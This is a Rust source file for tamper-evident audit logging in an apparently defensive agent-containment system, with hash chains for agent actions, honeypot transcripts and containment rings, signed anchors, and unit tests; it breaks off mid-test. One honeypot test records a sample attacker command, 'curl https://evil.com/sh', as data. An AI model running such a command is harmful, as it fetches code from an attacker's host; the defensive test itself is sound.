//! Hierarchical (Two-Tier) BLAKE3 Merkle Hash Chain Architecture
//!
//! Provides mathematically verifiable audit logging across:
//! 1. Per-Arm Merkle Chains (Agent limb execution & generation epoch progression)
//! 2. Per-Tarpit Merkle Chains (Forensic transcripts of trapped attacker sessions)
//! 3. Per-Ring Merkle Chains (Rings 0..3 containment transitions & cross-ring blinding detection)
//! 4. Hierarchical Merkle Anchoring (Interior node rollup with Ed25519 signatures anchored to global Merkle Tree & TPM)

use chrono::{DateTime, Utc};
use dashmap::DashMap;
use ed25519_dalek::{Signer, SigningKey, Verifier, VerifyingKey};
use rand::rngs::OsRng;
use serde::{Deserialize, Serialize};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex, OnceLock};

pub const GENESIS_HASH: &str = "0000000000000000000000000000000000000000000000000000000000000000";
pub const ANCHOR_ROLLUP_INTERVAL: u64 = 16;

// ============================================================================
// 1. Per-Arm Merkle Chain
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArmMerkleRecord {
    pub seq: u64,
    pub arm_id: String,
    pub epoch: u64,
    pub role: String,
    pub tool_or_action: String,
    pub tool_call_hash: String,
    pub hmac_sig: String,
    pub prev_hash: String,
    pub hash: String,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArmFractureProof {
    pub arm_id: String,
    pub old_epoch: u64,
    pub new_epoch: u64,
    pub reason: String,
    pub terminal_hash: String,
    pub fracture_hash: String,
    pub anchor_seq: u64,
    pub timestamp: DateTime<Utc>,
    pub global_root: Option<String>,
}

#[derive(Debug)]
struct ArmSessionChain {
    records: Vec<ArmMerkleRecord>,
    current_head: String,
    epoch: u64,
}

impl ArmSessionChain {
    fn new(initial_epoch: u64) -> Self {
        Self {
            records: Vec::new(),
            current_head: GENESIS_HASH.to_string(),
            epoch: initial_epoch,
        }
    }
}

// ============================================================================
// 2. Per-Tarpit Merkle Chain
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TarpitMerkleRecord {
    pub seq: u64,
    pub pid: u32,
    pub trap_id: String,
    pub payload_hash: String,
    pub payload_size: usize,
    pub timestamp_ns: u64,
    pub prev_hash: String,
    pub hash: String,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TarpitForensicTranscript {
    pub session_key: String,
    pub pid: u32,
    pub trap_id: String,
    pub head_hash: String,
    pub total_events: usize,
    pub records: Vec<TarpitMerkleRecord>,
    pub verified: bool,
}

#[derive(Debug)]
struct TarpitSessionChain {
    records: Vec<TarpitMerkleRecord>,
    current_head: String,
}

impl TarpitSessionChain {
    fn new() -> Self {
        Self {
            records: Vec::new(),
            current_head: GENESIS_HASH.to_string(),
        }
    }
}

// ============================================================================
// 3. Per-Ring Merkle Chain
// ============================================================================

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[repr(u8)]
pub enum ContainmentRingId {
    Ring0Kernel = 0,
    Ring1Sentinel = 1,
    Ring2PolicyMesh = 2,
    Ring3SandboxWorker = 3,
}

impl ContainmentRingId {
    pub fn as_str(&self) -> &'static str {
        match self {
            ContainmentRingId::Ring0Kernel => "Ring0Kernel",
            ContainmentRingId::Ring1Sentinel => "Ring1Sentinel",
            ContainmentRingId::Ring2PolicyMesh => "Ring2PolicyMesh",
            ContainmentRingId::Ring3SandboxWorker => "Ring3SandboxWorker",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RingMerkleRecord {
    pub seq: u64,
    pub ring: ContainmentRingId,
    pub event_id: String,
    pub transition: String,
    pub decision_hash: String,
    pub correlated: bool,
    pub prev_hash: String,
    pub hash: String,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CrossRingIntegrityStatus {
    pub intact: bool,
    pub ring0_correlated_count: usize,
    pub ring2_correlated_count: usize,
    pub dropped_events: usize,
    pub ring_chains_verified: bool,
    pub reason: String,
}

#[derive(Debug)]
struct RingChain {
    records: Vec<RingMerkleRecord>,
    current_head: String,
    correlated_count: usize,
}

impl RingChain {
    fn new() -> Self {
        Self {
            records: Vec::new(),
            current_head: GENESIS_HASH.to_string(),
            correlated_count: 0,
        }
    }
}

// ============================================================================
// 4. Hierarchical Merkle Anchoring
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HierarchicalMerkleAnchor {
    pub anchor_seq: u64,
    pub interior_hash: String,
    pub global_merkle_root: String,
    pub arm_root: String,
    pub tarpit_root: String,
    pub ring_root: String,
    pub ed25519_sig: String,
    pub public_key: String,
    pub trigger_reason: String,
    pub cross_ring_intact: bool,
    pub timestamp: DateTime<Utc>,
}

pub struct HierarchicalMerkleRegistry {
    arms: DashMap<String, Arc<Mutex<ArmSessionChain>>>,
    tarpits: DashMap<String, Arc<Mutex<TarpitSessionChain>>>,
    rings: [Arc<Mutex<RingChain>>; 4],
    anchors: Mutex<Vec<HierarchicalMerkleAnchor>>,
    signing_key: SigningKey,
    verifying_key: VerifyingKey,
    anchor_seq: AtomicU64,
    local_events_since_anchor: AtomicU64,
    internal_global_tree: crate::MerkleAuditTree,
}

impl Default for HierarchicalMerkleRegistry {
    fn default() -> Self {
        Self::new()
    }
}

impl HierarchicalMerkleRegistry {
    pub fn new() -> Self {
        let signing_key = SigningKey::generate(&mut OsRng);
        let verifying_key = signing_key.verifying_key();

        let registry = Self {
            arms: DashMap::new(),
            tarpits: DashMap::new(),
            rings: [
                Arc::new(Mutex::new(RingChain::new())),
                Arc::new(Mutex::new(RingChain::new())),
                Arc::new(Mutex::new(RingChain::new())),
                Arc::new(Mutex::new(RingChain::new())),
            ],
            anchors: Mutex::new(Vec::new()),
            signing_key,
            verifying_key,
            anchor_seq: AtomicU64::new(0),
            local_events_since_anchor: AtomicU64::new(0),
            internal_global_tree: crate::MerkleAuditTree::new(),
        };

        // Seed baseline arm, tarpit canary, and correlated ring events for live out-of-the-box audit verification
        registry.record_arm_event(
            "arm-cortex-primary",
            1,
            "coordinator",
            "system_init",
            "genesis_init_sig",
        );

        registry.record_tarpit_event(4, "ghost-canary-init", b"CANARY_INIT", 0);

        registry.record_ring_transition(
            ContainmentRingId::Ring0Kernel,
            "boot-ring0",
            "INITIALIZE",
            "k_init",
            true,
        );
        registry.record_ring_transition(
            ContainmentRingId::Ring1Sentinel,
            "boot-ring1",
            "INITIALIZE",
            "sentinel_init",
            false,
        );
        registry.record_ring_transition(
            ContainmentRingId::Ring2PolicyMesh,
            "boot-ring0",
            "INITIALIZE",
            "k_init",
            true,
        );
        registry.record_ring_transition(
            ContainmentRingId::Ring3SandboxWorker,
            "boot-ring3",
            "INITIALIZE",
            "sandbox_init",
            false,
        );

        // Initial anchor rollup
        registry.anchor_to_global_tree(None, "genesis_bootstrap");

        registry
    }

    pub fn verifying_key_hex(&self) -> String {
        hex::encode(self.verifying_key.to_bytes())
    }

    // --- Per-Arm Methods ---

    pub fn record_arm_event(
        &self,
        arm_id: &str,
        epoch: u64,
        role: &str,
        tool_or_action: &str,
        hmac_sig: &str,
    ) -> ArmMerkleRecord {
        let chain_entry = self
            .arms
            .entry(arm_id.to_string())
            .or_insert_with(|| Arc::new(Mutex::new(ArmSessionChain::new(epoch))));
        let chain_arc = chain_entry.value().clone();
        drop(chain_entry);

        let mut chain = chain_arc.lock().unwrap();
        chain.epoch = epoch;

        let tool_call_hash = blake3::hash(tool_or_action.as_bytes()).to_hex().to_string();

        let mut hasher = blake3::Hasher::new();
        hasher.update(b"OSOOSI_ARM_MERKLE_V1");
        hasher.update(chain.current_head.as_bytes());
        hasher.update(arm_id.as_bytes());
        hasher.update(&epoch.to_le_bytes());
        hasher.update(tool_call_hash.as_bytes());
        hasher.update(hmac_sig.as_bytes());
        let current_hash = hasher.finalize().to_hex().to_string();

        let seq = (chain.records.len() + 1) as u64;
        let record = ArmMerkleRecord {
            seq,
            arm_id: arm_id.to_string(),
            epoch,
            role: role.to_string(),
            tool_or_action: tool_or_action.to_string(),
            tool_call_hash,
            hmac_sig: hmac_sig.to_string(),
            prev_hash: chain.current_head.clone(),
            hash: current_hash.clone(),
            timestamp: Utc::now(),
        };

        chain.current_head = current_hash;
        chain.records.push(record.clone());
        drop(chain);

        self.on_local_event("arm_event");
        record
    }

    pub fn record_arm_fracture(
        &self,
        arm_id: &str,
        old_epoch: u64,
        new_epoch: u64,
        reason: &str,
        global_tree: Option<&crate::MerkleAuditTree>,
    ) -> ArmFractureProof {
        let terminal_hash = {
            let chain_entry = self
                .arms
                .entry(arm_id.to_string())
                .or_insert_with(|| Arc::new(Mutex::new(ArmSessionChain::new(old_epoch))));
            let chain_arc = chain_entry.value().clone();
            drop(chain_entry);
            let chain = chain_arc.lock().unwrap();
            chain.current_head.clone()
        };

        // Record the fracture event in the arm chain
        let fracture_action = format!(
            "FRACTURE: {} (epoch {} -> {})",
            reason, old_epoch, new_epoch
        );
        let fracture_rec = self.record_arm_event(
            arm_id,
            new_epoch,
            "fractured",
            &fracture_action,
            "SURGICAL_AUTOTOMY_SEVERANCE",
        );

        // Immediate high-severity anchor rollup
        let anchor = self.anchor_to_global_tree(
            global_tree,
            &format!(
                "arm_fracture_{}_epoch_{}_to_{}",
                arm_id, old_epoch, new_epoch
            ),
        );

        ArmFractureProof {
            arm_id: arm_id.to_string(),
            old_epoch,
            new_epoch,
            reason: reason.to_string(),
            terminal_hash,
            fracture_hash: fracture_rec.hash,
            anchor_seq: anchor.anchor_seq,
            timestamp: Utc::now(),
            global_root: Some(anchor.global_merkle_root),
        }
    }

    pub fn verify_arm_chain(&self, arm_id: &str) -> bool {
        let chain_arc = match self.arms.get(arm_id) {
            Some(entry) => entry.value().clone(),
            None => return true,
        };

        let chain = chain_arc.lock().unwrap();
        let mut expected_prev = GENESIS_HASH.to_string();

        for record in &chain.records {
            if record.prev_hash != expected_prev {
                return false;
            }

            let mut hasher = blake3::Hasher::new();
            hasher.update(b"OSOOSI_ARM_MERKLE_V1");
            hasher.update(expected_prev.as_bytes());
            hasher.update(record.arm_id.as_bytes());
            hasher.update(&record.epoch.to_le_bytes());
            hasher.update(record.tool_call_hash.as_bytes());
            hasher.update(record.hmac_sig.as_bytes());
            let computed = hasher.finalize().to_hex().to_string();

            if computed != record.hash {
                return false;
            }
            expected_prev = record.hash.clone();
        }

        expected_prev == chain.current_head
    }

    // --- Per-Tarpit Methods ---

    pub fn record_tarpit_event(
        &self,
        pid: u32,
        trap_id: &str,
        payload: &[u8],
        timestamp_ns: u64,
    ) -> TarpitMerkleRecord {
        let session_key = format!("{}:{}", pid, trap_id);
        let chain_entry = self
            .tarpits
            .entry(session_key.clone())
            .or_insert_with(|| Arc::new(Mutex::new(TarpitSessionChain::new())));
        let chain_arc = chain_entry.value().clone();
        drop(chain_entry);

        let mut chain = chain_arc.lock().unwrap();
        let payload_hash = blake3::hash(payload).to_hex().to_string();

        let mut hasher = blake3::Hasher::new();
        hasher.update(b"OSOOSI_TARPIT_MERKLE_V1");
        hasher.update(chain.current_head.as_bytes());
        hasher.update(&pid.to_le_bytes());
        hasher.update(trap_id.as_bytes());
        hasher.update(payload_hash.as_bytes());
        hasher.update(&timestamp_ns.to_le_bytes());
        let current_hash = hasher.finalize().to_hex().to_string();

        let seq = (chain.records.len() + 1) as u64;
        let record = TarpitMerkleRecord {
            seq,
            pid,
            trap_id: trap_id.to_string(),
            payload_hash,
            payload_size: payload.len(),
            timestamp_ns,
            prev_hash: chain.current_head.clone(),
            hash: current_hash.clone(),
            timestamp: Utc::now(),
        };

        chain.current_head = current_hash;
        chain.records.push(record.clone());
        drop(chain);

        self.on_local_event("tarpit_event");
        record
    }

    pub fn export_tarpit_transcript(
        &self,
        pid: u32,
        trap_id: &str,
    ) -> Option<TarpitForensicTranscript> {
        let session_key = format!("{}:{}", pid, trap_id);
        let chain_arc = self.tarpits.get(&session_key)?.value().clone();

        let chain = chain_arc.lock().unwrap();
        let records = chain.records.clone();
        let head_hash = chain.current_head.clone();
        drop(chain);

        // Verify transcript records from genesis
        let mut expected_prev = GENESIS_HASH.to_string();
        let mut verified = true;

        for record in &records {
            if record.prev_hash != expected_prev {
                verified = false;
                break;
            }

            let mut hasher = blake3::Hasher::new();
            hasher.update(b"OSOOSI_TARPIT_MERKLE_V1");
            hasher.update(expected_prev.as_bytes());
            hasher.update(&record.pid.to_le_bytes());
            hasher.update(record.trap_id.as_bytes());
            hasher.update(record.payload_hash.as_bytes());
            hasher.update(&record.timestamp_ns.to_le_bytes());
            let computed = hasher.finalize().to_hex().to_string();

            if computed != record.hash {
                verified = false;
                break;
            }
            expected_prev = record.hash.clone();
        }

        if expected_prev != head_hash {
            verified = false;
        }

        Some(TarpitForensicTranscript {
            session_key,
            pid,
            trap_id: trap_id.to_string(),
            head_hash,
            total_events: records.len(),
            records,
            verified,
        })
    }

    // --- Per-Ring Methods ---

    pub fn record_ring_transition(
        &self,
        ring: ContainmentRingId,
        event_id: &str,
        transition: &str,
        decision_payload: &str,
        correlated_pipeline_event: bool,
    ) -> RingMerkleRecord {
        let ring_idx = ring as usize;
        let ring_arc = self.rings[ring_idx].clone();
        let mut chain = ring_arc.lock().unwrap();

        let decision_hash = blake3::hash(decision_payload.as_bytes())
            .to_hex()
            .to_string();

        let mut hasher = blake3::Hasher::new();
        hasher.update(b"OSOOSI_RING_MERKLE_V1");
        hasher.update(chain.current_head.as_bytes());
        hasher.update(&[ring as u8]);
        hasher.update(event_id.as_bytes());
        hasher.update(transition.as_bytes());
        hasher.update(decision_hash.as_bytes());
        let current_hash = hasher.finalize().to_hex().to_string();

        let seq = (chain.records.len() + 1) as u64;
        if correlated_pipeline_event {
            chain.correlated_count += 1;
        }

        let record = RingMerkleRecord {
            seq,
            ring,
            event_id: event_id.to_string(),
            transition: transition.to_string(),
            decision_hash,
            correlated: correlated_pipeline_event,
            prev_hash: chain.current_head.clone(),
            hash: current_hash.clone(),
            timestamp: Utc::now(),
        };

        chain.current_head = current_hash;
        chain.records.push(record.clone());
        drop(chain);

        self.on_local_event("ring_transition");
        record
    }

    pub fn record_correlated_pipeline_event(&self, event_id: &str, decision_payload: &str) {
        self.record_ring_transition(
            ContainmentRingId::Ring0Kernel,
            event_id,
            "CORRELATED_INGEST",
            decision_payload,
            true,
        );
        self.record_ring_transition(
            ContainmentRingId::Ring2PolicyMesh,
            event_id,
            "CORRELATED_EVAL",
            decision_payload,
            true,
        );
    }

    pub fn verify_cross_ring_continuity(&self) -> CrossRingIntegrityStatus {
        let n0 = {
            let r0 = self.rings[ContainmentRingId::Ring0Kernel as usize]
                .lock()
                .unwrap();
            r0.correlated_count
        };
        let n2 = {
            let r2 = self.rings[ContainmentRingId::Ring2PolicyMesh as usize]
                .lock()
                .unwrap();
            r2.correlated_count
        };

        // Verify each of the 4 ring hash chains from genesis
        let mut all_chains_verified = true;
        let mut failed_ring = None;

        for ring_idx in 0..4 {
            let ring_arc = self.rings[ring_idx].clone();
            let chain = ring_arc.lock().unwrap();
            let mut expected_prev = GENESIS_HASH.to_string();
            let ring_id = match ring_idx {
                0 => ContainmentRingId::Ring0Kernel,
                1 => ContainmentRingId::Ring1Sentinel,
                2 => ContainmentRingId::Ring2PolicyMesh,
                _ => ContainmentRingId::Ring3SandboxWorker,
            };

            for record in &chain.records {
                if record.prev_hash != expected_prev {
                    all_chains_verified = false;
                    failed_ring = Some(ring_id);
                    break;
                }

                let mut hasher = blake3::Hasher::new();
                hasher.update(b"OSOOSI_RING_MERKLE_V1");
                hasher.update(expected_prev.as_bytes());
                hasher.update(&[ring_id as u8]);
                hasher.update(record.event_id.as_bytes());
                hasher.update(record.transition.as_bytes());
                hasher.update(record.decision_hash.as_bytes());
                let computed = hasher.finalize().to_hex().to_string();

                if computed != record.hash {
                    all_chains_verified = false;
                    failed_ring = Some(ring_id);
                    break;
                }
                expected_prev = record.hash.clone();
            }

            if expected_prev != chain.current_head {
                all_chains_verified = false;
                failed_ring = Some(ring_id);
            }
        }

        if !all_chains_verified {
            return CrossRingIntegrityStatus {
                intact: false,
                ring0_correlated_count: n0,
                ring2_correlated_count: n2,
                dropped_events: n0.saturating_sub(n2),
                ring_chains_verified: false,
                reason: format!(
                    "Tampering detected in ring chain {:?}: recomputed hash mismatch",
                    failed_ring
                ),
            };
        }

        if n0 != n2 {
            let dropped = n0.saturating_sub(n2);
            CrossRingIntegrityStatus {
                intact: false,
                ring0_correlated_count: n0,
                ring2_correlated_count: n2,
                dropped_events: dropped,
                ring_chains_verified: true,
                reason: format!(
                    "Asymmetric pipeline blinding detected: Ring 0 recorded {} events while Ring 2 observed only {} ({} dropped)",
                    n0, n2, dropped
                ),
            }
        } else {
            CrossRingIntegrityStatus {
                intact: true,
                ring0_correlated_count: n0,
                ring2_correlated_count: n2,
                dropped_events: 0,
                ring_chains_verified: true,
                reason: format!(
                    "Cross-ring integrity verified: Ring 0 and Ring 2 correlated pipelines in lockstep ({} events)",
                    n0
                ),
            }
        }
    }

    // --- Hierarchical Anchoring ---

    fn on_local_event(&self, reason: &str) {
        let count = self
            .local_events_since_anchor
            .fetch_add(1, Ordering::Relaxed)
            + 1;
        let high_severity = reason.contains("tarpit")
            || reason.contains("sever")
            || reason.contains("quarantine")
            || reason.contains("isolate")
            || reason.contains("epoch_advance")
            || reason.contains("fracture")
            || reason.contains("deception");

        if count >= ANCHOR_ROLLUP_INTERVAL || high_severity {
            self.anchor_to_global_tree(None, reason);
        }
    }

    pub fn anchor_to_global_tree(
        &self,
        external_global_tree: Option<&crate::MerkleAuditTree>,
        trigger_reason: &str,
    ) -> HierarchicalMerkleAnchor {
        self.local_events_since_anchor.store(0, Ordering::Relaxed);
        let seq = self.anchor_seq.fetch_add(1, Ordering::SeqCst) + 1;

        // 1. Fold Arm heads
        let arm_root = {
            let mut arm_hasher = blake3::Hasher::new();
            arm_hasher.update(b"OSOOSI_ARM_ROOT_FOLD_V1");
            let mut arm_keys: Vec<String> = self.arms.iter().map(|e| e.key().clone()).collect();
            arm_keys.sort();
            for k in &arm_keys {
                if let Some(chain) = self.arms.get(k) {
                    let guard = chain.lock().unwrap();
                    arm_hasher.update(k.as_bytes());
                    arm_hasher.update(guard.current_head.as_bytes());
                }
            }
            arm_hasher.finalize().to_hex().to_string()
        };

        // 2. Fold Tarpit heads
        let tarpit_root = {
            let mut tarpit_hasher = blake3::Hasher::new();
            tarpit_hasher.update(b"OSOOSI_TARPIT_ROOT_FOLD_V1");
            let mut tarpit_keys: Vec<String> =
                self.tarpits.iter().map(|e| e.key().clone()).collect();
            tarpit_keys.sort();
            for k in &tarpit_keys {
                if let Some(chain) = self.tarpits.get(k) {
                    let guard = chain.lock().unwrap();
                    tarpit_hasher.update(k.as_bytes());
                    tarpit_hasher.update(guard.current_head.as_bytes());
                }
            }
            tarpit_hasher.finalize().to_hex().to_string()
        };

        // 3. Fold Ring heads
        let ring_root = {
            let mut ring_hasher = blake3::Hasher::new();
            ring_hasher.update(b"OSOOSI_RING_ROOT_FOLD_V1");
            for ring_idx in 0..4 {
                let ring_id = match ring_idx {
                    0 => ContainmentRingId::Ring0Kernel,
                    1 => ContainmentRingId::Ring1Sentinel,
                    2 => ContainmentRingId::Ring2PolicyMesh,
                    _ => ContainmentRingId::Ring3SandboxWorker,
                };
                let guard = self.rings[ring_idx].lock().unwrap();
                ring_hasher.update(&[ring_id as u8]);
                ring_hasher.update(guard.current_head.as_bytes());
            }
            ring_hasher.finalize().to_hex().to_string()
        };

        // 4. Compute Interior Node Hash
        let mut interior_hasher = blake3::Hasher::new();
        interior_hasher.update(b"OSOOSI_HIERARCHICAL_ANCHOR_V1");
        interior_hasher.update(arm_root.as_bytes());
        interior_hasher.update(tarpit_root.as_bytes());
        interior_hasher.update(ring_root.as_bytes());
        interior_hasher.update(&seq.to_le_bytes());
        let interior_hash = interior_hasher.finalize().to_hex().to_string();

        // 5. Sign with Ed25519
        let signature = self.signing_key.sign(interior_hash.as_bytes());
        let ed25519_sig = hex::encode(signature.to_bytes());
        let public_key = self.verifying_key_hex();

        let cross_ring = self.verify_cross_ring_continuity();
        let nsrl_allowlist_root = crate::nsrl_aslr_merkle::global_nsrl_aslr_merkle()
            .nsrl_engine()
            .global_root();

        // 6. Anchor to Global Tree & TPM
        let anchor_payload = serde_json::json!({
            "anchor_seq": seq,
            "interior_hash": interior_hash,
            "arm_root": arm_root,
            "tarpit_root": tarpit_root,
            "ring_root": ring_root,
            "nsrl_allowlist_root": nsrl_allowlist_root,
            "ed25519_sig": ed25519_sig,
            "public_key": public_key,
            "trigger_reason": trigger_reason,
            "cross_ring_intact": cross_ring.intact,
        });

        let global_merkle_root = if let Some(ext_tree) = external_global_tree {
            let root = ext_tree.log("HIERARCHICAL_MERKLE_ANCHOR", anchor_payload.clone());
            let _ = self
                .internal_global_tree
                .log("HIERARCHICAL_MERKLE_ANCHOR", anchor_payload);
            root
        } else {
            self.internal_global_tree
                .log("HIERARCHICAL_MERKLE_ANCHOR", anchor_payload)
        };

        let anchor = HierarchicalMerkleAnchor {
            anchor_seq: seq,
            interior_hash,
            global_merkle_root,
            arm_root,
            tarpit_root,
            ring_root,
            ed25519_sig,
            public_key,
            trigger_reason: trigger_reason.to_string(),
            cross_ring_intact: cross_ring.intact,
            timestamp: Utc::now(),
        };

        let mut anchors_lock = self.anchors.lock().unwrap();
        anchors_lock.push(anchor.clone());
        if anchors_lock.len() > 500 {
            anchors_lock.remove(0);
        }

        anchor
    }

    pub fn force_rollup_anchor(&self, trigger_reason: &str) -> HierarchicalMerkleAnchor {
        self.anchor_to_global_tree(None, trigger_reason)
    }

    pub fn get_recent_anchors(&self, limit: usize) -> Vec<HierarchicalMerkleAnchor> {
        let anchors = self.anchors.lock().unwrap();
        let start = anchors.len().saturating_sub(limit);
        anchors[start..].to_vec()
    }

    pub fn get_latest_anchor(&self) -> Option<HierarchicalMerkleAnchor> {
        let anchors = self.anchors.lock().unwrap();
        anchors.last().cloned()
    }

    pub fn get_summary(&self) -> serde_json::Value {
        let cross_ring = self.verify_cross_ring_continuity();
        let r0_count = self.rings[0].lock().unwrap().records.len();
        let r1_count = self.rings[1].lock().unwrap().records.len();
        let r2_count = self.rings[2].lock().unwrap().records.len();
        let r3_count = self.rings[3].lock().unwrap().records.len();
        let latest = self.get_latest_anchor();

        serde_json::json!({
            "status": "ok",
            "arm_count": self.arms.len(),
            "tarpit_session_count": self.tarpits.len(),
            "rings": {
                "ring0_kernel_events": r0_count,
                "ring1_sentinel_events": r1_count,
                "ring2_policy_mesh_events": r2_count,
                "ring3_sandbox_worker_events": r3_count,
            },
            "cross_ring_continuity": cross_ring,
            "latest_anchor": latest,
            "public_key": self.verifying_key_hex(),
            "nsrl_aslr_merkle": crate::nsrl_aslr_merkle::global_nsrl_aslr_merkle().get_summary(),
        })
    }

    pub fn internal_global_tree(&self) -> &crate::MerkleAuditTree {
        &self.internal_global_tree
    }

    pub fn verify_anchor_signature(anchor: &HierarchicalMerkleAnchor) -> Result<bool, String> {
        let pubkey_bytes = hex::decode(&anchor.public_key)
            .map_err(|e| format!("Invalid hex in public key: {}", e))?;
        if pubkey_bytes.len() != 32 {
            return Err("Public key must be 32 bytes".to_string());
        }
        let mut pk_arr = [0u8; 32];
        pk_arr.copy_from_slice(&pubkey_bytes);
        let verifying_key = VerifyingKey::from_bytes(&pk_arr)
            .map_err(|e| format!("Invalid VerifyingKey: {}", e))?;

        let sig_bytes = hex::decode(&anchor.ed25519_sig)
            .map_err(|e| format!("Invalid hex in signature: {}", e))?;
        if sig_bytes.len() != 64 {
            return Err("Signature must be 64 bytes".to_string());
        }
        let mut sig_arr = [0u8; 64];
        sig_arr.copy_from_slice(&sig_bytes);
        let signature = ed25519_dalek::Signature::from_bytes(&sig_arr);

        verifying_key
            .verify(anchor.interior_hash.as_bytes(), &signature)
            .map(|_| true)
            .map_err(|e| format!("Signature verification failed: {}", e))
    }
}

pub fn global_hierarchical_merkle() -> &'static Arc<HierarchicalMerkleRegistry> {
    static INSTANCE: OnceLock<Arc<HierarchicalMerkleRegistry>> = OnceLock::new();
    INSTANCE.get_or_init(|| Arc::new(HierarchicalMerkleRegistry::new()))
}

// ============================================================================
// Unit Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_per_arm_merkle_chain_and_fracture_proof() {
        let registry = HierarchicalMerkleRegistry::new();
        let arm_id = "arm-cortex-code-gen";

        assert!(registry.verify_arm_chain(arm_id));

        let rec1 = registry.record_arm_event(arm_id, 1, "worker", "read_file", "hmac1");
        assert_eq!(rec1.seq, 1);
        assert_eq!(rec1.prev_hash, GENESIS_HASH);
        assert!(registry.verify_arm_chain(arm_id));

        let rec2 = registry.record_arm_event(arm_id, 1, "worker", "write_file", "hmac2");
        assert_eq!(rec2.seq, 2);
        assert_eq!(rec2.prev_hash, rec1.hash);
        assert!(registry.verify_arm_chain(arm_id));

        // Test surgical autotomy fracture proof
        let fracture =
            registry.record_arm_fracture(arm_id, 1, 2, "unauthorized_lateral_access", None);
        assert_eq!(fracture.old_epoch, 1);
        assert_eq!(fracture.new_epoch, 2);
        assert_eq!(fracture.terminal_hash, rec2.hash);
        assert_ne!(fracture.fracture_hash, rec2.hash);
        assert!(fracture.global_root.is_some());
        assert!(registry.verify_arm_chain(arm_id));
    }

    #[test]
    fn test_per_tarpit_merkle_chain_forensic_transcript() {
        let registry = HierarchicalMerkleRegistry::new();
        let pid = 9182;
        let trap_id = "ssh_honeypot_session_01";

        let rec1 = registry.record_tarpit_event(pid, trap_id, b"USER root", 1_000_000);
        let rec2 = registry.record_tarpit_event(pid, trap_id, b"PASS 123456", 2_000_000);
        let rec3 =
            registry.record_tarpit_event(pid, trap_id, b"CMD curl https://evil.com/sh", 3_000_000);

        assert_eq!(rec1.seq, 1);
        assert_eq!(rec2.seq, 2);
        assert_eq!(rec3.seq, 3);
        assert_eq!(rec2.prev_hash, rec1.hash);
        assert_eq!(rec3.prev_hash, rec2.hash);

        let transcript = registry
            .export_tarpit_transcript(pid, trap_id)
            .expect("transcript must exist");
        assert_eq!(transcript.total_events, 3);
        assert_eq!(transcript.head_hash, rec3.hash);
        assert!(transcript.verified);
    }

    #[test]
    fn test_per_ring_cross_ring_blinding_detection() {
        let registry = HierarchicalMerkleRegistry::new();

        // Currently seeded with balanced boot events
        let initial_status = registry.verify_cross_ring_continuity();
        assert!(initial_status.intact);
        assert_eq!(initial_status.dropped_events, 0);

        // Record 50 correlated pipeline events in Ring 0 and Ring 2
        for i in 0..50 {
            registry.record_correlated_pipeline_event(&format!("event-{}", i), "policy_ok");
        }
        let lockstep_status = registry.verify_cross_ring_continuity();
        assert!(lockstep_status.intact);
        assert_eq!(lockstep_status.dropped_events, 0);

        // Simulate attacker blinding Ring 2: record 2 uncorroborated events directly into Ring 0
        registry.record_ring_transition(
            ContainmentRingId::Ring0Kernel,
            "blinded-event-1",
            "KERNEL_EXEC",
            "decision_unknown",
            true, // marks correlated on Ring 0 without Ring 2 seeing it!
        );
        registry.record_ring_transition(
            ContainmentRingId::Ring0Kernel,
            "blinded-event-2",
            "KERNEL_EXEC",
            "decision_unknown",
            true,
        );

        let blinded_status = registry.verify_cross_ring_continuity();
        assert!(
            !blinded_status.intact,
            "Cross-ring continuity must detect asymmetric blinding"
        );
        assert_eq!(blinded_status.dropped_events, 2);
        assert!(blinded_status
            .reason
            .contains("Asymmetric pipeline blinding detected"));
    }

    #[test]
    fn test_hierarchical_interior_node_anchor_into_global_merkle_tree() {
        let registry = HierarchicalMerkleRegistry::new();
        let global_tree = crate::MerkleAuditTree::new();

        let anchor = registry.anchor_to_global_tree(Some(&global_tree), "manual_test_anchor");
        assert!(anchor.anchor_seq >= 2); // Initial bootstrap anchor was #1
        assert_ne!(anchor.interior_hash, GENESIS_HASH);
        assert_ne!(anchor.global_merkle_root, "0".repeat(64));

        // Verify Ed25519 signature
        let pub_key_bytes = hex::decode(&anchor.public_key).expect("valid hex pub key");
        let verifying_key = VerifyingKey::from_bytes(&pub_key_bytes.try_into().unwrap())
            .expect("valid verifying key");
        let sig_bytes = hex::decode(&anchor.ed25519_sig).expect("valid hex sig");
        let sig = ed25519_dalek::Signature::from_bytes(&sig_bytes.try_into().unwrap());

        assert!(verifying_key
            .verify(anchor.interior_hash.as_bytes(), &sig)
            .is_ok());
        assert!(HierarchicalMerkleRegistry::verify_anchor_signature(&anchor).unwrap());

        // Verify Global Merkle Audit Tree verification
        assert!(global_tree.verify());
        let proof = global_tree
            .generate_proof(0)
            .expect("proof must exist for anchor leaf");
        assert_eq!(proof.root_hash, anchor.global_merkle_root);
    }

    #[test]
    fn test_adversarial_arm_merkle_chain_tamper_rejection() {
        let registry = HierarchicalMerkleRegistry::new();
        let arm_id = "arm-adversarial-limb";

        // Build a legitimate 5-event chain
        let mut recs = Vec::new();
        for i in 1..=5 {
            let rec = registry.record_arm_event(
                arm_id,
                1,
                "worker",
                &format!("action_{}", i),
                &format!("sig_{}", i),
            );
            recs.push(rec);
        }

        assert!(
            registry.verify_arm_chain(arm_id),
            "Baseline chain must verify"
        );

        // Attack Scenario 1: Flip bit in hash of record 2 (middle of chain)
        {
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            let original_hash = chain.records[2].hash.clone();
            chain.records[2].hash = "deadbeef".repeat(8);
            drop(chain);
            drop(chain_entry);

            assert!(
                !registry.verify_arm_chain(arm_id),
                "Tampered middle record hash MUST be rejected by verify_arm_chain"
            );

            // Restore
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            chain.records[2].hash = original_hash;
        }
